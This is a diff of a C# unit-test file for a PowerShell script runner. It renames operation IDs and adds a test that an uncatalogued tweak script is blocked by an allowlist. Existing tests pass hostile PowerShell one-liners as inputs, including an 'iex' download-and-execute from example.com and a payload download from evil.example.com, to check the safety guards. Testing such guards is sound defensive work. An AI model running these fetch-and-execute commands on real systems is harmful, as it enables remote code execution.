@@ -20,7 +20,7 @@ public sealed class PowerShellRunnerTests
 
         var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
         {
-            OperationId = "test.dynamic",
+            OperationId = "updates.test.dynamic",
             StepName = "apply",
             Script = "iex ((New-Object Net.WebClient).DownloadString('https://example.com/install.ps1'))",
             DryRun = false
@@ -45,7 +45,7 @@ public sealed class PowerShellRunnerTests
 
         var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
         {
-            OperationId = "test.host",
+            OperationId = "updates.test.host",
             StepName = "download",
             Script = "Invoke-WebRequest -Uri 'https://evil.example.com/payload.ps1' -OutFile \"$env:TEMP\\payload.ps1\"",
             DryRun = false
@@ -70,7 +70,7 @@ public sealed class PowerShellRunnerTests
 
         var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
         {
-            OperationId = "test.trusted",
+            OperationId = "updates.test.trusted",
             StepName = "download",
             Script = "Invoke-WebRequest -Uri 'https://aka.ms/getwinget' -OutFile \"$env:TEMP\\AppInstaller.msixbundle\"",
             DryRun = true
@@ -78,5 +78,30 @@ public sealed class PowerShellRunnerTests
 
         Assert.True(result.Success);
         Assert.Equal(0, result.ExitCode);
+    }
+
+    [Fact]
+    public async Task ExecuteAsync_BlocksUncatalogedTweakScript_WhenCatalogAllowlistEnabled()
+    {
+        var settings = new AppSettings
+        {
+            EnforceScriptSafetyGuards = true
+        };
+
+        var paths = TestHelpers.CreateIsolatedPaths();
+        var console = new ConsoleStreamService();
+        var log = TestHelpers.CreateLogService(paths, () => settings);
+        var runner = new PowerShellRunner(console, log, paths, () => settings);
+
+        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
+        {
+            OperationId = "tweak.test.unsafescript",
+            StepName = "apply",
+            Script = "Write-Output 'hello from untrusted tweak script'",
+            DryRun = true
+        }, CancellationToken.None);
+
+        Assert.False(result.Success);
+        Assert.Contains("trusted catalog allowlist", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
     }
 }
